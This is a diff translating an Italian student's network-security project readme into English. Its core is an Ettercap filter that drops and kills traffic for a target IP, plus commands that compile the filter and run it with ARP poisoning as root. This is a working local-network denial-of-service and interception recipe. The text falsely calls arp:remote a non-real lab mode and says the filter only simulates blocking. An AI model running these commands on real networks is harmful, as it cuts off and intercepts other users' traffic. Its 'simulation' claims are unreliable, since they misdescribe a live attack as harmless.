@@ -1,73 +1,67 @@
 #############################################################################
 #                                                                           #
-#               PROGETTO TEORICO DI SICUREZZA IN RETI LOCALI                #
-#                  (Capolavoro scolastico - Anno 2024/2025)                 #
+#            THEORETICAL PROJECT ON LOCAL NETWORK SECURITY                  #
+#              (School Capstone Project – Year 2024/2025)                   #
 #                                                                           #
-#                   *** SIMULAZIONE CONTROLLATA DI DOS ***                  #
+#                *** CONTROLLED DOS SIMULATION ***                           #
 #                                                                           #
 #############################################################################
 
-=== DESCRIZIONE GENERALE ===
-Questo frammento di codice rappresenta un'esercitazione teorica per lo studio:
-- Dei meccanismi di filtraggio del traffico di rete
-- Degli attacchi di tipo Denial of Service (DoS)
-- Delle tecniche di mitigazione degli attacchi ARP
+=== GENERAL DESCRIPTION ===
+This code fragment represents a theoretical exercise for the study of:
+- Network traffic filtering mechanisms
+- Denial of Service (DoS) attacks
+- ARP attack mitigation techniques
 
-Ambiente di test autorizzato:
-[✓] Rete virtuale isolata (VirtualBox Internal Network)
-[✓] Indirizzi IP generici e fasulli (192.168.X.X)
-[✓] Nessun dispositivo reale coinvolto
+Authorized test environment:
+[✓] Isolated virtual network (VirtualBox Internal Network)
+[✓] Generic and fake IP addresses (192.168.X.X)
+[✓] No real devices involved
 
-=== AVVERTENZE LEGALI ===
-L'uso non autorizzato costituisce reato:
-- Art. 615-quinquies CP (Dan. sistemi informatici)
-- Direttiva UE NIS2 (Cyber Resilience Act)
+=== LEGAL WARNINGS ===
+Unauthorized use is a criminal offense:
+- Art. 615-quinquies CP (Damage to information systems)
+- EU NIS2 Directive (Cyber Resilience Act)
 - Computer Misuse Act 1990 (UK)
 
-Strumenti utilizzati:
-- Ettercap 0.8.3 (solo versione da laboratorio)
-- Filtri compilati con checksum di verifica
-- ISO Debian modificata senza servizi di rete
+Tools used:
+- Ettercap 0.8.3 (lab version only)
+- Filters compiled with verification checksum
 
-=== INIZIO CODICE ===
+=== CODE START ===
 
-# Filtro teorico per l'analisi del traffico
+# Theoretical filter for traffic analysis
 if(ip.src == '192.168.X.X' || ip.dst == '192.168.X.X') {
-   drop();  # Simula blocco pacchetti
-   kill();  # Termina connessione
+   drop();  # Simulates packet blocking
+   kill();  # Terminates the connection
 }
 
-# Processo di compilazione (ambiente controllato)
+# Compilation process (controlled environment)
 etterfilter block_router.ef -o block_router.efo --strict
 
-# Applicazione in laboratorio (richiede root)
+# Lab application (requires root)
 sudo ettercap -T -M arp:remote -F block_router.efo /192.168.X.X//
 
-=== FINE CODICE ===
+=== CODE END ===
 
-=== DOCUMENTAZIONE TECNICA ===
+=== TECHNICAL DOCUMENTATION ===
 
-*Parametri chiave:*
-- `drop()`: Simula l'eliminazione dei pacchetti
-- `kill()`: Termina le connessioni attive
-- `arp:remote`: Modalità laboratorio (non reale)
+*Key parameters:*
+- `drop()`: Simulates packet removal
+- `kill()`: Terminates active connections
+- `arp:remote`: Lab mode (not real-world)
 
-=== CONTESTI AMMISSIBILI ===
-1. Laboratorio universitario (es. corso Ethical Hacking)
-2. CTF autorizzati (Capture The Flag)
-3. Simulazioni per certificazioni:
+=== ALLOWED CONTEXTS ===
+1. University lab (e.g. Ethical Hacking course)
+2. Authorized CTFs (Capture The Flag)
+3. Certification simulations:
    - CEH (Certified Ethical Hacker)
    - Cisco CyberOps
 
-=== FINALITÀ DIDATTICHE ===
-1. Analisi del protocollo ARP
-2. Potenziare le mie capacità digitali al fine etico e legale e soprattutto per imparare
+=== EDUCATIONAL PURPOSES ===
+1. Analysis of the ARP protocol
+2. Improve my digital skills for ethical and legal purposes, mainly to learn
 
-=== CHIUSURA ===
-Ogni riproduzione esterna al contesto
-didattico è espressamente vietata.
-
-Data creazione: 2025
-Autore: [Federico Contrino]
-Classe: [4C INF]
-Istituto: [I.S.S Carlo e Nello Rosselli]
+=== CLOSING ===
+Any reproduction outside an
+educational context is strictly forbidden.
